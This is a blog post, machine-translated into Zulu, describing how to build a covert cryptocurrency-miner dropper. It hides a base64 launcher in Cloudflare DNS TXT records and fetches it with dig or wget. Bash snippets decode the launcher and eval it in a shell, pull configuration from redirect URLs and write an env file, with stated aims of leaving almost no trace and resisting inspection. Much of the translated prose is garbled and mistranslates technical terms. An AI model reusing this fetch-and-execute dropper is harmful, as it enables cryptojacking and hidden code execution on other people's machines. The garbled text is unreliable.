<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=zu><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link title="indawo ka-untoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/zu/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=English property=og:locale><meta content=English property=og:locale:alternate><meta content=German property=og:locale:alternate><meta content=Italian property=og:locale:alternate><meta content="Mandarin Chinese"property=og:locale:alternate><meta content=Spanish property=og:locale:alternate><meta content=Hindi property=og:locale:alternate><meta content=Arabic property=og:locale:alternate><meta content=Portuguese property=og:locale:alternate><meta content=Bengali property=og:locale:alternate><meta content=Russian property=og:locale:alternate><meta content=Japanese property=og:locale:alternate><meta content=Punjabi property=og:locale:alternate><meta content=Javanese property=og:locale:alternate><meta content=Vietnamese property=og:locale:alternate><meta content=French property=og:locale:alternate><meta content=Urdu property=og:locale:alternate><meta content=Turkish property=og:locale:alternate><meta content=Polish property=og:locale:alternate><meta content=Ukranian property=og:locale:alternate><meta content=Dutch property=og:locale:alternate><meta content=Greek property=og:locale:alternate><meta content=Swedish property=og:locale:alternate><meta content=Zulu property=og:locale:alternate><meta content=Romanian property=og:locale:alternate><meta content=Malay property=og:locale:alternate><meta content=Korean property=og:locale:alternate><meta content=Thai property=og:locale:alternate><meta content=Filipino property=og:locale:alternate><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> IziKronike ze-cryptonote dropper</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/zu/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/zu/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-11-06T11:18:38.747","inLanguage":"zu","name":"","mainEntityOfPage":{"@id":"/zu/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/zu/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" untoreh-ukukhanya"class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Sesha Iwebhusayithi"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/zu/posts/><i class="fas fa-pen menu-icons"></i> okuthunyelwe</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/zu/media/><i class="fas fa-tv menu-icons"></i> abezindaba</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Sesha Iwebhusayithi"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/zu/posts/><i class="fas fa-pen menu-icons"></i> okuthunyelwe</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/zu/media/><i class="fas fa-tv menu-icons"></i> abezindaba</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/zu/posts/chronichles_of_a_cryptonote_dropper> IziKronike ze-cryptonote dropper</a></h1><blockquote id=page-description style=font-style:italic>... Uzimisele ukudlulela kude kangakanani ... namasenti?</blockquote></div><div class=franklin-content><p>Thatha sengathi ufuna okwami<a href=https://en.wikipedia.org/wiki/Cryptocurrency> Izimali zedijithali</a> kurimothi<em> okubonakalayo</em> hardware. Udinga ukuthola okuthile okwami. Amaseva akude asho, cha<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> IZIMPENDULO</a> noma ubufakazi be-GPU bokusebenza komsebenzi, ngokuyisisekelo kuphela<a href=\posts/a-few-notes-on-proof-of-work> Izinhlamvu zemali ezinobungani be-CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Isoftware</a></h2><p>Sesha bese uthola i-<a href=https://github.com/xmrig/xmrig> umvukuzi</a> , kepha ayisihle ngempela, ungathanda okuthile ongakulawula kangcono kusuka kude, ngakho-ke uthola<a href=https://github.com/Bendr0id/xmrigCC> omunye umvukuzi</a> . Ufuna futhi i-<a href=https://github.com/Bendr0id/xmrigcc-proxy> ummeleli</a> , ngoba ukuxhumana okuningi kuzophila isikhathi esifushane, awufuni<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> i-dos</a> ichibi lakho lezimayini. Futhi i-<a href=https://github.com/search?q=tunnel> umhubhe</a> kungaba kuhle.<h2 id=the_design><a class=header-anchor href=#the_design> Umklamo</a></h2><p>Amanye ama-botnets asebenzisa idatha ye-blockchains ukubheka imiyalo,<a href=https://twitter.com/sarahjamielewis> umuntu othile</a> futhi kubonakala sengathi inayo<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> ukubheja okulahlekile</a> kulokhu ngeke kuphinde kwenzeke ... noma kunjalo asiyona leyo nkimbinkimbi, sizokwazi ukuthola amanye amarekhodi e-DNS agcina iskripthi esidonsa umthwalo okhishwa kumkhombandlela we-temp futhi ushiye<em> cishe</em> akukho mkhondo wokusetha kwayo. Nayi ishadi lokugeleza elincane elikhombisa isakhiwo</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> Isiqalisi</a></h2><p>Iphuzu lesikripthi sokuqalisa lizotholakala futhi libuyekezwe kalula ngendlela yokuthi limelana nokuhlolwa kwesikhathi. Iyabuyekeza<a href=https://en.wikipedia.org/wiki/Domain_Name_System> I-DNS</a> amarekhodi alula, futhi i-DNS yinto yokugcina evalwa ngaphakathi kwenethiwekhi..ngoba amakheli e-IP kunzima ukuwakhumbula ... ngakho-ke amathuba ukuthi azotholakala ezikhathini eziningi. Uyabona lapho sikhona<em> ukulanda iskripthi sokusatshalaliswa</em>empeleni sesivele sisebenzisa i-logic ethile, lesi yisikripthi sesiqalisi, sidinga ikhono lokwenza imibuzo ye-DNS ukubheka amarekhodi ethu, i-DNS ingahle ibe khona yonke indawo kepha<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> bamba</a> ayiyona.<p>Kukhona i-conundrum encane lapha, uma kufanele silande elinye ithuluzi<em> ukulanda omunye umbhalo ukulanda umthwalo okhokhelwayo</em> kufanele silande umthwalo okhokhelwayo! Ekuvikeleni ... ukwenza lo mdanso wesikripthi kunezela obfuscation, kuvumela ukugcina ukusetshenziswa okukodwa kuphela kwesiqalisi (ukugcinwa, yay), akudingeki ezikhathini eziningi..ngakho futhi sisebenzela<a href=https://en.wikipedia.org/wiki/Standalone_program> kuxhunyaniswe ngokwezibalo</a> bamba okungahle kwenziwe ukwenza imibuzo ye-dns, elandwe ngokuzibamba ngokwakho, noma ukusingathwa kwamafu (yebo kukhona okungahambi kahle, okufana no-3 noma u-4, ngoba izinsizakalo zefu zinomkhawulokudonsa wamahhala omncane kakhulu, futhi zidinga amakhukhi noma amathokheni wokufinyelela ... akunabungane, ngenhloso kunjalo, kunjalo).<p>Yini kumarekhodi e-dns? Sisebenzisa<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> amarekhodi, kusizinda sangokwezifiso (ukuwa emuva nalapha). Kungani TXT? kwenzeka kube yizo ezingagcina inani elikhulu kakhulu ledatha .. imvamisa njengoba iluhlobo lwe<a href=https://www.ietf.org/rfc/rfc6763.txt> kunconyiwe</a> kuya nge<em> izinto</em> . Sisebenzisa ngqo<a href=https://www.cloudflare.com/> ukuqhuma</a> okokubhida kwethu kwe-DNS ngoba kumahhala, futhi umdlali omuhle kakhulu kuphela edolobheni (<em> hhayi impela kepha noma yiziphi ezinye izinhlobo zamaparele zinokuhlakanipha</em> ). Kwenzeka ukuthi ukwazi ukugcina izingcezu eziningi zedatha ku-<em> ngokufanayo</em> qopha ... lokhu kuqala ukudideka nokuxaka ngokucaciswa okuthile ... (tangent) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> wawuvamise</a> vumela<em> eboshwe ngamaketanga</em>Amarekhodi we-TXT aphelele angama-byte angama-9k, amadokhumenti manje asho ama-byte ama-2k, ngaphambi koshintsho ebengilisebenzisa ~ 6k ngicabanga, futhi bengisebenzisa iskripthi singacindezelwe, ngemuva kwalokho bekufanele nginciphise iskripthi ngisicindezele ngaphambi kwesandla (empeleni mina ngazama ukusebenzisa i-<a href=https://freedns.afraid.org/> ukukhulu</a> umhlinzeki, ngavinjelwa kungakapheli usuku olulodwa, ngiqagela ukuthi banenqubomgomo eqinile yamarekhodi we-TXT), kepha ukucindezelwa kwe-gzip kubonakala KUNGABONA ubungane bamapayipi futhi bekusabangela izinkinga, ngakho-ke bekufanele ngiphathe ukugcwalisa iskripthi ngaphandle kokucindezelwa ( end tangent).<p>Siligcina kanjani? Amarekhodi we-TXT asekela kuphela izintambo ze-alphanumeric, cha<a href=https://en.wikipedia.org/wiki/Null_character> Ama-NUL</a> , ngakho-ke kufanele siyisonge ngokufaka ikhodi okungeyona eyize,<a href=https://en.wikipedia.org/wiki/Base64> isisekelo64</a> wenelisa lesi sikhawulo, futhi ngoba siyagcina<em> eboshwe ngamaketanga</em> Amarekhodi we-TXT, kufanele sikunqamule okukhiphayo, ngoba sisebenzisa izinto zeShell, lokhu kwenziwa nge<code>-w</code> ifulegi, ebhokisini elixakekile lelo flegi belijwayele ukungabikho (noma ukungena) kuzinguqulo ezindala ebezicasula, enye indlela ukusebenzisa isifaki khodi esihlanganiswe ne-openssl,<code>openssl enc -base64</code>.<p>Manje njengoba sesazi ukugcina umbhalo wethu wokuhambisa siwugcina nganoma iyiphi<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf ehl</a> noma ngesandla. Siyidonsa kanjani? Sishilo ukuthi sidinga ama-bindutils noma awethu<code>dig</code> ... ngemuva kokukhetha iphoyinti lokugcina elisebenzayo, sifuna ukulilanda, okutholakalayo ngokuvamile<a href=https://www.gnu.org/software/wget/> wget</a> noma<a href=https://curl.se/> i-curl</a> , i-wget itholakala ifakiwe ifakiwe kaningi, kepha i-busybox ihlinzeka kuphela ngokuxhaswa kwe-tls ngemitapo yolwazi enamandla, ngakho-ke kufanele uqiniseke ukuthi iphoyinti lokugcina likhonza i-http noma insiza yakho<code>wget</code> kusuka ku-gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Kusho ukuthi zama<code>-t2</code> izikhathi ezilindile<code>-T10</code> imizuzwana ibe<code>-q</code> ukufunda buthule kusuka<code>-i-</code> i-stdin (<code>$digurl</code> ) nokubhalela<code>-O-</code> i-stdout (<code>$filename</code>). Lo myalo awukuvezi esikulandayo shazi. Sizoqaphela kakhulu neminye imiyalo yeShell ngesizathu esifanayo, noma ukunamathela ngeShell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) okwakhelwe ngaphakathi lapho kungenzeka khona. Nakekela futhi ukuthi ulanda kuphi okwenzekayo, ufuna ukuqinisekisa ukuthi uyakwazi ukukwenza, ngoba amanye amaphuzu akhweza, ikakhulukazi ezitsheni kanye<code>tmp</code> izindlela zikhona<code>noexec</code> . Manje njengoba sesinethuluzi lethu lokubuza i-dns silanda amarekhodi ethu<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Amafulegi ayazichaza lapha,<code>+short</code> kusho nje ukuthi sinentshisekelo kuphela kudatha uqobo lwayo, ukuze kungadingeki ukuthi sihlolisise umphumela. Kubalulekile ukucacisa iseva ye-DNS, njenge-google (<code>8.8.8.8</code> noma i-cloudflare (<code>1.1.1.1</code> ) ngoba izindawo eziningi ziqondisa kabusha noma zisebenzisa imibuzo ye-proxy dns kumaseva wazo e-dns ngokuzenzakalela. Ngemuva kokulanda iskripthi esikhonjiwe sibhekana nezingcaphuno nezikhala zabelungu ukuze sikulungele ukukhipha amakhodi<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Kuthiwani uma manje thina<em> namanje</em> awunaso isiqalisi sethu? I-DNS ingcolile, sifuna ukubuyela emuva, sivumele ukusetha isizinda esingaphansi silande iskripthi sesiqalisi ngqo. Ngaphambi kokuhlola iskripthi sethu sifuna ukusenza ngokwezifiso, ngokuhlukahluka okuthile, futhi masisebenzise ukurekhoda kwe-TXT ukugcina uhlu lwe-NAME = VALUE lokuguquguqukayo bese sikuhlwaya. Kukhona futhi ukubuyela emuva kokuguquguqukayo, i-cloudflare inikeza ukuqondiswa kabusha okuya ngama-URL, lokhu kuqondiswa kabusha kuyasetshenzwa<em> ngaphambi</em> indawo okuyiwa kuyo, ngakho-ke asidingi iphoyinti lokugcina, sifuna ukumisa imithetho yokuqondisa kabusha esekwe ku-regex iye ekugcineni okuyinkohliso, esikuthandayo yimingcele ye-url<code>?NAME=VALUE&NAME2=VALUE2...</code>, ukuze sikwazi ukusungula isiqalisi sethu ngokumane sishintshe i-url eqondisa kabusha, ngaso sonke isikhathi sinake ukucaphuna nokubaleka amakhodi<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>I-wget<code>-S</code> iphrinta i-url eqondisa kabusha esinentshisekelo yokuyihlaziya. Ukuba nemingcele nesikripthi, sihlola okuguquguqukayo okukubhala ngaphezulu kwefayela<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Leli fayela lizotholwa iskripthi sokuhambisa. Ingxenye yokugcina yombhalo wokuqalisa ingeyangempela<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> i-trampoline</a> , hlola iskripthi ngaphakathi kwenqubo yamanje yeShell, noma mhlawumbe mayiphathwe yi-tmux uma kungenzeka.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
